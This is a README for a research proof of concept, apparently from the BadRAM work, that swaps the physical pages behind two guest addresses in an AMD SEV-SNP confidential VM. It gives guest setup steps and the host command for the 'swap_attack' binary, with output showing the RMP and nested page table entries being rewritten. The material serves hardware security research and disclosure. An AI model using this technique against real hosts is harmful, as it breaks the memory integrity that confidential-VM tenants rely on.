# rmp swap attack
POC for swapping the PFNs of two GFNs. For now, requires 2MB hugepages
inside the vm.
## on the vm
Configure 2MB huge pages by adding the following to the kernel cmdline
`hugepagesz=2M hugepages=2`. You need to reboot for the changes to take effect.

Afterwards, `/proc/meminfo` should look as follows
```
luca@sevvictim:~$ cat /proc/meminfo | grep -i huge
AnonHugePages:         0 kB
ShmemHugePages:        0 kB
FileHugePages:         0 kB
HugePages_Total:       2
HugePages_Free:        2
HugePages_Rsvd:        0
HugePages_Surp:        0
Hugepagesize:       2048 kB
Hugetlb:            4096 kB
```

Next, start the victim inside the VM with  
```
luca@sevvictim:~$ sudo ./badram-gpa-swap-victim 
[sudo] password for luca: 
Setting 2MB page A to 0 and 2 MB page B to 0xff
2MB page A (0) 0x49800000
2MB page A (0)_vaddr 0x7f5d2d000000
2MB page B (0xff) 0x6ee00000
2MB page B (0xff)_vaddr 0x7f5d2d200000
Do the remapping, then press enter
                                                   
First 64 bytes of 2MB page A (should now be 0xff instead of 0x00) : 
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff 

First 64 bytes of 2MB page B (should now be 0x00 instead of 0xff) : 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

luca@sevvictim:~$ 

```

## on the host
It is assumed that `./edited-aliases.csv` contains the alias functions and that `0x97d00000 0xa82fffff` is the address of the rmp as reported by `dump-rmp-msrs.sh` (requires `msr-tools` to be installed).

`0x49800000 ` and `0x6ee00000` are the guest physical addresses of the buffers *A* and *B* from the victim application inside the VM


```
luca@horus:~/badram/binaries$ sudo ./swap_attack 0x97d00000 0xa82fffff ./edited-aliases.csv $(pidof qemu-system-x86_64) 0x49800000 0x6ee00000
hpa is 0x667a00000
hpa is 0x156000000
gpa1 0x49800000 hpa1 0x667a00000 4K aligned? 1 2MB aligned? 1
gpa2 0x6ee00000 hpa2 0x156000000 4K aligned? 1 2MB aligned? 1
SPTE for gpa1 is 0x667a00ee7, parsed hpa 0x667a00000
Setting gfn in rmp entry for gpa1 to 0x6ee00
We assume that data scrambling is disabled!
Original Entry: assigned=1 pagesize=1 immutable=0, gpa=0x49800 asid=3 vmsa=0 validated=1
Setting gfn entry in rmp for gpa2 to 0x49800
We assume that data scrambling is disabled!
Original Entry: assigned=1 pagesize=1 immutable=0, gpa=0x6ee00 asid=3 vmsa=0 validated=1


Changing npt for gpa1

SPTE for gpa1 is  0x156000ee7, parsed hpa 0x156000000
SPTE for gpa with 2mb align is 0x156000ee7, parsed hpa 0x156000000
luca@horus:~/badram/binaries$ 

```
